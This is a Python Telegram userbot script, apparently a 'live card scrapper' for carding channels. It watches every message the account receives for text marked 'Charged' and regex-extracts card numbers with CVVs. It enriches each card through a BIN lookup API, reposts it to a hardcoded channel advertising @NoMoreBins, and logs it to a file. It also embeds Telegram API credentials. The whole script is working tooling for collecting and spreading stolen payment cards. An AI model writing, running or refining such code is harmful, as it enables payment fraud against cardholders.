import pyrogram
import re
import asyncio
import aiohttp

app = pyrogram.Client(
    'IStudyLaw',
    api_id='26578883',
    api_hash='a1a89f14a30226181296bba23290b286'
)

apijonasxastro = 'https://binlist.io/lookup/{}'

def filter_cards(text):
    regex = r'\d{16}.*\d{3}'
    matches = re.findall(regex, text)
    return matches

async def get_bin_info(mars):
    async with aiohttp.ClientSession() as session:
        async with session.get(apijonasxastro.format(mars)) as response:
            if response.status == 200:
                return await response.json()
            else:
                return None

async def approve(Client, message):
    try:
        if re.search(r'(Charged|⊛ Card ➠)', message.text):
            filtered_card_info = filter_cards(message.text)
            if not filtered_card_info:
                return

            for card_info in filtered_card_info:
                mars = card_info[:6]
                bin_info = await get_bin_info(mars)
                if bin_info and bin_info.get('success', False):
                    data = bin_info
                    formatted_message = (
                        f"<b>╭                                                            ╮</b>\n"
                        f"<b>         ɴ⋈ʙ ʟɪᴠᴇ ᴄᴀʀᴅ ꜱᴄʀᴀᴘᴘᴇʀ </b>\n\n"
                        f"<b>ᴄᴀʀᴅ ≫ </b><code>{card_info}</code>\n"
                        f"<b>ꜱᴛᴀᴛᴜꜱ  ≫  LIVE CARD ✅</b>\n"
                        f"<b>ᴛʏᴘᴇ  ≫ {data.get('scheme', '')} - {data.get('type', '')}</b>\n"
                        f"<b>ᴄᴏᴜɴᴛʀʏ  ≫ {data.get('country', {}).get('name', '')} {data.get('country', {}).get('emoji', '')}</b>\n"
                        f"<b>ʙᴀɴᴋ  ≫ {data.get('bank', {}).get('name', '')}</b>\n\n"
                        f"<b>         ᴊᴏɪɴ ᴜꜱ ⥇ @NoMoreBins   </b>\n"
                        f"<b>╰                                                            ╯"
                    )

                    await asyncio.sleep(5)
                    await Client.send_message(chat_id=-1002079839737, text=formatted_message)

                    with open('reserved.txt', 'a', encoding='utf-8') as f:
                        f.write(card_info + '\n')
                else:
                    pass 
    except Exception as e:
        print(e)

@app.on_message()
async def astroboy(Client, message):
    if message.text:
        await asyncio.create_task(approve(Client, message))

app.run()
